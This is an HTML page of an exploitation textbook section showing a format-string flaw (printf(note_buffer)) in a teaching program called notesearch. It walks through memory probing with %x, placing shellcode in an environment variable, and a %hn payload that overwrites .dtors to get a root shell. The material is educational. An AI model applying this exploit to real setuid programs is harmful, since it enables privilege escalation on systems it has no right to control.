<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x358 Another notesearch Vulnerability</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part68.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part70.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;"><a name="bookmark59">0x358 Another notesearch Vulnerability</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: justify;">In addition to the buffer overflow vulnerability, the notesearch program from Chapter 2 also suffers from a format string vulnerability. This vulner- ability is shown in bold in the code listing below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_587.png"/></span></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int print_notes(int fd, int uid, char *searchstring) { int note_length;</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">char byte=0, note_buffer[100];</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">note_length = find_user_note(fd, uid); if(note_length == -1) // If end of file reached,</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 10pt;text-align: left;">return 0;      //  return 0.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">read(fd, note_buffer, note_length); // Read note data. note_buffer[note_length] = 0;    // Terminate the string.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">if(search_note(note_buffer, searchstring)) // If searchstring found,</p><p class="s46" style="padding-left: 104pt;text-indent: 12pt;line-height: 107%;text-align: left;">printf(note_buffer);           <span class="s31">//  print the note. return 1;</span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_588.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This function reads the <span class="s31">note_buffer </span>from the file and prints the contents of the note without supplying its own format string. While this buffer canâ€™t be directly controlled from the command line, the vulnerability can be exploited by sending exactly the right data to the file using the notetaker program and then opening that note using the notesearch program. In the following output, the notetaker program is used to create notes to probe memory in the note- search program. This tells us that the eighth function parameter is at the beginning of the buffer.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_589.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e &#39;print &quot;%x.&quot;x10&#39;) [DEBUG] buffer  @ 0x804a008: &#39;AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.&#39; [DEBUG] datafile @ 0x804a070: &#39;/var/notes&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] file descriptor is 3 Note has been saved.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch AAAA [DEBUG] found a 34 byte note for user id 999 [DEBUG] found a 41 byte note for user id 999 [DEBUG] found a 5 byte note for user id 999 [DEBUG] found a 35 byte note for user id 999</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">AAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">-------[ end of note data ]------- reader@hacking:~/booksrc $ ./notetaker BBBB%8\$x [DEBUG] buffer  @ 0x804a008: &#39;BBBB%8$x&#39; [DEBUG] datafile @ 0x804a070: &#39;/var/notes&#39; [DEBUG] file descriptor is 3</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">Note has been saved. reader@hacking:~/booksrc $ ./notesearch BBBB</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">[DEBUG] found a 34 byte note for user id 999 [DEBUG] found a 41 byte note for user id 999 [DEBUG] found a 5 byte note for user id 999 [DEBUG] found a 35 byte note for user id 999 [DEBUG] found a 9 byte note for user id 999 BBBB42424242</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_590.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now that the relative layout of memory is known, exploitation is just a matter of overwriting the <span class="s31">.dtors </span>section with the address of injected shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_591.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9e8</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p 0xbfff - 8</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$1 = 49143</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) p 0xf9e8 - 0xbfff</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$2 = 14825</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nm ./notesearch | grep DTOR 08049c60 d <u>&nbsp;</u>DTOR_END<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08049c5c d <u>&nbsp;</u>DTOR_LIST<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notetaker $(printf &quot;\x62\x9c\x04\x08\x60\x9c\x04\ x08&quot;)%49143x%8\$hn%14825x%9\$hn</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[DEBUG] buffer  @ 0x804a008: &#39;b?`?%49143x%8$hn%14825x%9$hn&#39; [DEBUG] datafile @ 0x804a070: &#39;/var/notes&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] file descriptor is 3 Note has been saved.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch 49143x [DEBUG] found a 34 byte note for user id 999 [DEBUG] found a 41 byte note for user id 999 [DEBUG] found a 5 byte note for user id 999 [DEBUG] found a 35 byte note for user id 999 [DEBUG] found a 9 byte note for user id 999 [DEBUG] found a 33 byte note for user id 999</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 261pt;text-indent: 0pt;text-align: left;">21</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.2# whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">root sh-3.2#</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_592.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part68.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part70.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
